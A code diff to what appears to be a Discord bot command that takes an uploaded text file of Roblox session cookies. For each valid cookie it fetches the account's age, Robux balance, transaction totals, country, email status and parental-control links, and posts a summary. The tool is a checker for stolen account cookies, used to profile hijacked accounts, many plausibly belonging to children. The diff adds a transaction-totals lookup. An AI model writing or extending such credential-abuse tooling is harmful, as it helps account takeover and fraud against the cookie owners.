@@ -8,7 +8,6 @@ import {
 import * as Roblox from '../../lib/roblox-api';
 import { buildSuccessEmbed, buildErrorEmbed, buildInvalidCookieEmbed, buildIpLimitEmbed, buildProgressEmbed, buildAccountEmbed } from '../../lib/embed-helpers';
 import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
-import { EMOJIS } from '../../lib/emoji';
 import { logger } from '../../lib/logger';
 import type { Command } from './types';
 
@@ -39,7 +38,7 @@ const data = new SlashCommandBuilder()
   .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
   .addAttachmentOption((opt) =>
     opt.setName('file')
-      .setDescription('Insert .TXT Files Type')
+      .setDescription('A .txt file containing cookies')
       .setRequired(true),
   ) as SlashCommandBuilder;
 
@@ -79,15 +78,17 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       if (!validation.valid) continue;
 
       validCount++;
-      const age = await Roblox.getUserAge(validation.userId!);
-      const robux = await Roblox.fetchRobux(rawCookie, String(validation.userId!));
+      const userId = validation.userId!;
+      const age = await Roblox.getUserAge(userId);
+      const robux = await Roblox.fetchRobux(rawCookie, String(userId));
+      const summary = await Roblox.fetchTransactionTotals(rawCookie, String(userId));
       const country = await Roblox.fetchCountry(rawCookie);
       const email = await Roblox.fetchEmailInfo(rawCookie);
       const parental = await Roblox.fetchParentalControls(rawCookie);
       totalRobux += robux;
 
       let emailStatus = 'No email';
-      if (email.verified) emailStatus = `${EMOJIS.VERIFICATION} Verified`;
+      if (email.verified) emailStatus = '✅ Verified';
       else if (email.pending) emailStatus = '⏳ Pending';
 
       const id = Math.random().toString(36).slice(2, 10);
@@ -95,12 +96,13 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       const embed = buildAccountEmbed(
         validation.username!,
         validation.displayName || null,
-        validation.userId!,
+        userId,
         age,
         robux,
+        summary,
         country,
         emailStatus,
-        parental.hasParent ? `${EMOJIS.VERIFICATION} Linked` : '❌ None'
+        parental.hasParent ? '✅ Linked' : '❌ None'
       );
       await interaction.followUp({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral });
     }
@@ -119,7 +121,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
 
 async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
   if (await handleCopyButtonClick(interaction)) return;
-
 }
 
 export const checkCommand: Command = { data, execute, handleButton };
